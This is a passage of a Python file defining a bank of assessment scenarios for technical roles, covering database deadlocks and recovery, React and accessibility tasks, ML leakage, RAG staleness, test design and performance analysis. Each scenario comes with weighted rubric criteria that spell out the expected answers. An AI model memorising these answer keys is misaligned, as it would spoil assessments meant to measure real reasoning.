            K("diagnosis", "Diagnosis", 25, "No index on customer_id; status index is unselective (70%), so a sequential scan of 22M rows plus sort; cost grows with table size."),
            K("index", "Index design", 35,
              "Composite index such as (customer_id, status, created_at DESC) or (customer_id, created_at DESC) WHERE status='shipped' (partial), optionally INCLUDE (total) for index-only scans; explains equality columns before the ORDER BY column."),
            K("rollout", "Trade-offs and rollout", 25, "CREATE INDEX CONCURRENTLY, write amplification and storage cost, consider dropping the unhelpful status index, test on a replica/staging first."),
            K("verify", "Verification and upkeep", 15, "Re-run EXPLAIN ANALYZE, monitor pg_stat_statements/latency, autovacuum/ANALYZE statistics, index bloat checks."),
        ),
    ),
    Scenario(
        "dba-deadlock-transfers", "Deadlocks in money transfers",
        ("database-administrator",), ("transactions", "dba-monitoring"),
        """The payments service runs transfers like this (two concurrent sessions shown):

Session 1: BEGIN; UPDATE accounts SET balance = balance - 100 WHERE id = 7;   -- then
           UPDATE accounts SET balance = balance + 100 WHERE id = 9; COMMIT;
Session 2: BEGIN; UPDATE accounts SET balance = balance - 50 WHERE id = 9;    -- then
           UPDATE accounts SET balance = balance + 50 WHERE id = 7; COMMIT;

Database log:
ERROR: deadlock detected
DETAIL: Process 4121 waits for ShareLock on transaction 99812; blocked by process 4127.
        Process 4127 waits for ShareLock on transaction 99811; blocked by process 4121.
Deadlocks rose from ~2/day to ~300/day after a promotion doubled traffic. The service shows the error to users.""",
        (
            "Explain exactly how the deadlock happens.",
            "Propose application and database changes to prevent or handle it.",
            "Discuss isolation levels and whether changing them would help here.",
        ),
        (
            K("mechanism", "Explains the deadlock", 30, "Each transaction locks one row then waits for the other's row (7→9 vs 9→7), creating a cycle; the database aborts one victim."),
            K("prevention", "Prevention", 35, "Lock rows in a consistent order (e.g. by account id, SELECT ... FOR UPDATE ordered), keep transactions short, single statement updates where possible."),
            K("handling", "Handling", 20, "Retry the aborted transaction with backoff and idempotency, do not surface raw errors to users, monitor deadlock rate."),
            K("isolation", "Isolation level reasoning", 15, "Explains that raising isolation (e.g. SERIALIZABLE) does not remove lock-ordering deadlocks and adds serialization failures; the fix is ordering plus retries."),
        ),
    ),
    Scenario(
        "dba-point-in-time-recovery", "Recover from an accidental DELETE",
        ("database-administrator",), ("dba-backup",),
        """At 14:05 a developer ran `DELETE FROM customers WHERE region = 'west'` on production (PostgreSQL) instead of staging. 38,000 rows were removed; the application kept running and has written new orders since.
Backups: nightly base backup at 01:00 and continuous WAL archiving to object storage. Agreed RPO: 5 minutes; RTO: 2 hours. A streaming replica exists with no replication delay.""",
        (
            "Why does the replica not help, and what are your recovery options?",
            "Describe the step-by-step recovery you would perform, including how you choose the recovery target.",
            "How do you bring the deleted rows back without losing orders written after 14:05?",
            "What would you change to prevent or limit such incidents?",
        ),
        (
            K("options", "Recovery options", 20, "The replica already applied the DELETE; options are PITR from base backup + WAL to a separate instance, or a delayed replica if one existed."),
            K("pitr", "Correct PITR procedure", 35, "Restore the 01:00 base backup to a new server, replay WAL with recovery_target_time just before 14:05 (or target xid/LSN), promote, verify row counts."),
            K("merge", "Merging without data loss", 30, "Export the deleted customers from the restored instance and re-insert into production (handling FK/IDs and changes since), rather than failing over to the old point in time; validate with the business."),
            K("prevention", "Prevention", 15, "Least-privilege production access, peer review/safe-update settings, delayed replica, regular restore drills to prove RPO/RTO."),
        ),
    ),
    # ------------------------------------------------------------------ Frontend / mobile
    Scenario(
        "fe-react-debounced-search", "Build a debounced search component",
        (*FRONTEND, "full-stack-developer"), ("react", "frontend-frameworks"),
        """Implement a React function component <UserSearch onSelect={fn} /> for an admin dashboard.
API: GET /api/users?q=<text>  → 200 [{ "id": 1, "name": "Asha Rao", "email": "asha@example.com" }, ...]
       may return 429 or 500; responses can arrive out of order.
Requirements:
- Search after the user stops typing for 300 ms; do not search for fewer than 2 characters.
- Show loading, empty ("No users found") and error states; a slow earlier request must never overwrite newer results.
- Keyboard accessible: the results list can be navigated with arrow keys and Enter selects (call onSelect(user)).
- Clean up timers and in-flight requests when the component unmounts.""",
        (
            "Write the component (hooks-based JSX). Plain fetch is fine; no external libraries are required.",
            "Explain how your code prevents stale responses and handles cleanup.",
            "Describe how you would test it (what cases, and with which tools).",
        ),
        (
            K("correctness", "Correct, working component", 35,
              "Uses state + useEffect with a 300 ms debounce, minimum length check, fetch with error handling for non-OK responses, renders loading/empty/error/results, calls onSelect."),
            K("races", "Stale responses and cleanup", 25, "AbortController or request-id guard so only the latest response is applied; clears timeouts and aborts on unmount/query change."),
            K("accessibility", "Accessibility", 20, "Labelled input, listbox/option roles or equivalent, aria-activedescendant/aria-selected or focus management, arrow keys and Enter handling."),
            K("testing", "Testing approach", 20, "React Testing Library with fake timers and mocked fetch: debounce, min length, error state, out-of-order responses, keyboard selection."),
        ),
        estimated_minutes=25,
        deliverable="Component code plus a short explanation.",
    ),
    Scenario(
        "fe-accessible-responsive-form", "Fix an inaccessible sign-up form",
        FRONTEND, ("html-css",),
        """Markup and CSS from the current sign-up page:

<div class="form" style="width: 600px">
  <input placeholder="Email">
  <input placeholder="Password" type="password">
  <div class="btn" onclick="submitForm()">Sign up</div>
  <span style="color:#bbb">Password must be 8+ characters</span>
  <span class="error" style="color:red; display:none">Invalid email</span>
</div>
.form input { border: none; border-bottom: 1px solid #eee; outline: none; }
.btn { background: #6cf; color: #fff; padding: 8px; }

On phones the form overflows horizontally. Screen reader users report they cannot tell what each field is or when an error occurs.""",
        (
            "List the accessibility and responsiveness problems.",
            "Rewrite the HTML and CSS to fix them.",
            "Explain how you would verify the result (tools and manual checks).",
        ),
        (
            K("issues", "Identifies the problems", 30,
              "Placeholder-only labels, div used as a button (no keyboard/role), removed focus outline, low-contrast hint/button text, error not announced or linked, fixed 600px width, no form element/submit semantics."),
            K("markup", "Correct semantic markup", 30, "form element, label for/id, button type=submit, aria-describedby for hints, aria-invalid and aria-live/role=alert for errors, autocomplete attributes."),
            K("css", "Responsive, accessible CSS", 25, "Fluid width (max-width, %, rem), visible :focus-visible styles, WCAG AA contrast, adequate touch target sizes."),
            K("verify", "Verification", 15, "Keyboard-only walkthrough, screen reader check, axe/Lighthouse, contrast checker, responsive device testing."),
        ),
        deliverable="Corrected markup/CSS plus explanation.",
    ),
    Scenario(
        "mobile-offline-orders-screen", "Design an offline-friendly list screen",
        ("mobile-app-developer", "android-developer", "ios-developer"), ("mobile-ui", "android-ui", "ios-ui"),
        """Field sales reps use the app in areas with poor connectivity. Design the "My Orders" screen:
- Shows up to 2,000 orders with search and status filters.
- Reps can create an order offline; it must sync when connectivity returns.
- The list must scroll smoothly on low-end devices.
- The backend API is paginated (GET /orders?cursor=...) and returns 409 if an order was changed by someone else.""",
        (
            "Describe the screen states and UI behaviour (loading, empty, offline, syncing, errors).",
            "Explain the data/sync architecture you would use on your platform (local storage, sync queue, conflict handling).",
            "How do you keep the list fast and the UI responsive?",
        ),
        (
            K("states", "Complete UI states", 25, "Loading/skeleton, empty, offline banner, pending-sync badges per order, retry on error, pull-to-refresh, clear conflict messaging."),
            K("sync", "Sound offline sync design", 35,
              "Local database as source of truth (Room/Core Data/SQLite), outbox queue for offline creates with idempotency keys, background sync when connectivity returns, conflict handling for 409 (show, merge or retry), cursor-based incremental refresh."),
            K("performance", "Performance", 25, "Recycled/virtualised lists (RecyclerView/LazyColumn/UICollectionView/FlatList), paging, off-main-thread work, debounced search, stable keys, avoiding over-rendering."),
            K("ux", "User experience judgement", 15, "Communicates sync state honestly, preserves user input, accessible touch targets and text."),
        ),
    ),
    # ------------------------------------------------------------------ Data / ML / AI
    Scenario(
        "data-revenue-drop-investigation", "Dashboard revenue suddenly dropped",
        ("data-engineer", "data-analyst"), ("data-quality", "data-cleaning"),
        """The daily revenue dashboard shows yesterday at ₹6.1 L instead of the usual ~₹10 L. Business says sales were normal.
Pipeline: orders exported from the app DB at 23:30 → loaded into the warehouse → aggregated into daily_revenue.
Observations:
- Yesterday's export has 41,200 rows (normal ~40,000) but 3,900 order_ids appear twice.
- From 15:00 yesterday, the app started sending `amount` in paise instead of rupees for UPI orders (release notes: "store amounts as integers").
- The aggregation step filters `WHERE amount < 100000` to "remove outliers".
- Orders placed between 23:30 and 23:59 arrive in the next day's export.""",
        (
            "Explain which issues explain the drop and how each affects the number.",
            "Describe how you would correct yesterday's data.",
            "Propose data quality checks and pipeline changes to prevent a repeat.",
        ),
        (
            K("analysis", "Explains the drop", 35,
              "Paise values (×100) for UPI orders are removed by the < 100000 outlier filter, lowering revenue; duplicates would inflate revenue if not deduplicated; late-arriving orders shift revenue between days."),
            K("correction", "Correct backfill", 25, "Normalise units using the release time/order type, deduplicate on order_id (keep latest), reprocess the affected partitions, re-run aggregates, communicate corrected figures."),
            K("checks", "Data quality checks", 25, "Schema/unit contracts with the app team, uniqueness tests on order_id, distribution/volume anomaly checks, freshness checks, alerting before publishing."),
            K("design", "Pipeline design", 15, "Event-time vs processing-time handling for late data, idempotent loads, documented outlier rules."),
        ),
    ),
    Scenario(
        "ml-churn-model-leakage", "A churn model that is too good offline",
        ("data-scientist", "machine-learning-engineer"), ("model-evaluation", "statistics", "mlops"),
        """A churn model shows 98.7% accuracy and 0.99 ROC-AUC in offline validation (random 80/20 split of 2023–2024 customers).
In production it flags almost nobody who later churns.
Facts:
- 6% of customers churn.
- Top features by importance: days_since_last_login, support_tickets_last_30d, account_closed_reason_code, plan_downgrades.
- Feature values are computed from the data warehouse snapshot taken when the model was trained.
- Customers appear multiple times (one row per month).""",
        (
            "Explain why offline metrics are misleading and what is likely wrong.",
            "Describe a correct validation setup and the metrics you would report.",
            "How would you monitor the model after redeployment?",
        ),
        (
            K("leakage", "Identifies leakage", 35,
              "account_closed_reason_code (and possibly other post-churn features) leak the label; features computed from a later snapshot use future information; repeated customers across train/test leak identity."),
            K("imbalance", "Metric reasoning", 20, "With 6% churn, accuracy is uninformative (always 'no churn' gives 94%); use precision/recall, PR-AUC, calibration, cost-based thresholds."),
            K("validation", "Correct validation", 30, "Point-in-time feature computation, time-based split (train on earlier months, test later), group split by customer, remove leaking features, baseline comparison."),
            K("monitoring", "Monitoring", 15, "Track prediction and feature drift, delayed-label performance, calibration, retraining triggers."),
        ),
    ),
    Scenario(
        "ai-rag-outdated-answers", "A RAG assistant gives outdated answers",
        ("ai-engineer",), ("llm-apps", "ai-evaluation"),
        """An internal HR assistant uses retrieval-augmented generation: policies are chunked (1,000 tokens), embedded and stored in a vector database; the top 3 chunks are added to the prompt.
Users report it says "employees get 18 days of leave" — the 2025 policy says 24 days.
Retrieval log for "how many leave days do I get?":
1. leave_policy_2022.pdf (score 0.83) "...18 days of paid leave..."
2. travel_policy.pdf (score 0.79)
3. leave_policy_2025.pdf (score 0.78) "...24 days of paid leave, effective April 2025..."
The model answered from chunk 1 and did not cite sources.""",
        (
            "Explain the likely causes, both retrieval and generation side.",
            "Propose concrete fixes to the pipeline.",
            "Design an evaluation that would have caught this before release.",
        ),
        (
            K("causes", "Causes", 30, "Outdated documents still indexed, no recency/version metadata, coarse chunks, similarity ties, prompt not instructing to prefer latest/cite, no conflict handling."),
            K("fixes", "Fixes", 35, "Remove/archive superseded documents or filter by effective date metadata, better chunking, hybrid search + re-ranking, include dates in context, require citations and abstain when sources conflict."),
            K("evaluation", "Evaluation design", 25, "Golden question set with expected answers and sources, retrieval metrics (recall@k), answer faithfulness/groundedness checks, regression tests when documents change."),
            K("ops", "Operations", 10, "Document ingestion ownership, feedback loop from users, monitoring of unanswered/low-confidence questions."),
        ),
    ),
    Scenario(
        "nlp-ticket-classifier-degradation", "A transformer ticket classifier is degrading",
        ("nlp-engineer",), ("transformers",),
        """A fine-tuned BERT-base model routes support tickets into 12 queues. Six months after launch:
- Macro-F1 fell from 0.88 to 0.71; the "billing" and "new-product" queues are hit hardest.
- Many new tickets mention a product launched last month ("ZipPay"); the tokenizer splits it into rare sub-word pieces.
- Tickets are now often pasted email threads; 40% exceed 512 tokens and the pipeline truncates from the end, keeping only the start.
- Training data: 30,000 labelled tickets from launch; labels were assigned by a rules engine, not by agents.
- Inference p95 latency must stay under 150 ms on CPU.""",
        (
            "Diagnose the likely causes of the degradation.",
            "Propose changes to data, model and preprocessing, considering the latency budget.",
            "Describe how you would evaluate the new model before and after deployment.",
        ),
        (
            K("diagnosis", "Diagnosis", 30, "Data/concept drift (new product, new vocabulary), truncation dropping the relevant latest message, noisy rule-based labels, class distribution shift."),
            K("data", "Data improvements", 25, "Fresh human-labelled samples (active learning on low-confidence tickets), label audit, include new-product examples, class balance checks."),
            K("model", "Model and preprocessing", 30, "Better truncation (keep the latest message/strip quoted history, head+tail), domain-adaptive fine-tuning, consider a distilled model (DistilBERT/quantisation) to stay within 150 ms, retraining cadence."),
            K("evaluation", "Evaluation and rollout", 15, "Time-based holdout, per-class F1 and confusion matrix, shadow/canary deployment, drift and confidence monitoring."),
        ),
    ),
    # ------------------------------------------------------------------ Quality
    Scenario(
        "qa-coupon-test-design", "Test a discount coupon feature",
        ("software-tester", "qa-engineer"), ("test-design", "bug-reporting"),
        """Feature: coupon codes at checkout.
Rules: code is 6–10 uppercase letters/digits; each coupon has a percentage (5–50%) or fixed amount (₹50–₹2,000); minimum cart value ₹500; one coupon per order; expired coupons are rejected; discount never makes the total negative; codes are case-insensitive when entered.
Observed during exploratory testing: applying the fixed ₹2,000 coupon to a ₹1,500 cart shows a total of −₹500 and the "Pay" button is enabled.""",
        (
            "Design a set of test cases (use techniques such as boundary value analysis and equivalence partitioning); show at least 10.",
            "Which cases would you automate first and why?",
            "Write a bug report for the observed defect.",
        ),
        (
            K("coverage", "Test design quality", 40,
              "Boundaries for code length (5/6/10/11), percentage (4/5/50/51) and amounts, min cart 499/500, expired vs valid dates, case-insensitivity, single-coupon rule, negative-total clamp, invalid characters, rounding."),
            K("technique", "Explicit techniques", 15, "Names and applies BVA/equivalence classes/decision tables correctly."),
            K("automation", "Automation priorities", 15, "Prioritises high-risk, frequently-run, deterministic business rules (API/unit level) over brittle UI checks."),
            K("bug-report", "Quality bug report", 30, "Clear title, environment, steps, expected vs actual, severity/priority with justification (payment of negative amount), evidence."),
        ),
    ),
    Scenario(
        "qa-flaky-ui-suite", "Stabilise a flaky end-to-end suite",
        ("automation-test-engineer",), ("automation-frameworks",),
        """A Selenium/Playwright end-to-end suite of 240 tests runs on every merge. 12–20 different tests fail on each run and pass on retry. Developers now ignore red builds.
Code patterns found:
- `time.sleep(3)` before clicking buttons
- Locators like `//div[3]/div[2]/button[1]`
- All tests share one test user and run in parallel
- Tests depend on order: test_checkout assumes test_add_to_cart ran first
- Third-party payment sandbox is called directly and is sometimes slow""",
        (
            "Explain why each pattern causes flakiness.",
            "Propose a plan to stabilise the suite, with the order you would do things in.",
            "How would you measure progress and keep the suite healthy?",
        ),
        (
            K("causes", "Explains the flakiness", 30, "Fixed sleeps vs dynamic timing, brittle positional locators, shared mutable test data under parallelism, order dependence, unstable external dependency."),
            K("fixes", "Concrete fixes", 40,
              "Explicit/auto waits on conditions, stable test ids/role-based locators, isolated data per test (fixtures, API setup), independent tests, stub/mock the payment provider or contract tests, quarantine flaky tests with ownership."),
            K("plan", "Prioritised plan", 15, "Measures flakiness first, fixes the highest-impact patterns, quarantines rather than blindly retries, rebuilds trust in red builds."),
            K("metrics", "Measuring health", 15, "Flake rate per test, retry counts, suite duration, test pyramid balance, dashboards and SLAs for fixing flakes."),
        ),
    ),
    Scenario(
        "perf-latency-regression", "Latency doubled after a release",
        ("performance-test-engineer",), ("perf-analysis", "perf-tools"),
        """Load test (same script, 200 requests/s for 20 minutes) before and after release 4.2:
             p50     p95     p99     errors   app CPU   DB CPU   DB connections (pool max 50)
4.1          80 ms   210 ms  380 ms  0.1%     55%       40%      18 avg
4.2          95 ms   520 ms  2.4 s   1.8%     48%       45%      50 (saturated)  — "timeout acquiring connection" errors
Release 4.2 added an "order history" widget that calls GET /orders/recent on every page view; it runs one query per order item (N+1).""",
        (
            "Interpret the results: what is the bottleneck and why do p95/p99 degrade so much more than p50?",
            "What additional measurements or tools would you use to confirm?",
            "Recommend fixes and how you would re-test.",
        ),
        (
            K("interpretation", "Correct interpretation", 35, "Connection pool saturation causes queueing: tail latency and timeouts grow while CPU is not the limit; the N+1 widget multiplies queries per request."),
            K("measurements", "Confirming the cause", 25, "APM traces, DB query counts per request, pool wait-time metrics, slow query log, profiling with and without the widget."),
            K("fixes", "Fixes", 25, "Remove N+1 (join/batch query), cache or lazy-load the widget, right-size pool only after query fix, add timeouts/backpressure."),
            K("retest", "Re-test approach", 15, "Same workload, baseline comparison, longer soak test, percentiles and error rate as acceptance criteria."),
        ),
    ),
)

SCENARIO_BY_ID: dict[str, Scenario] = {s.id: s for s in SCENARIOS}


def scenarios_for(role_slug: str, competency_id: str) -> list[Scenario]:
    return [s for s in SCENARIOS if role_slug in s.roles and competency_id in s.competencies]
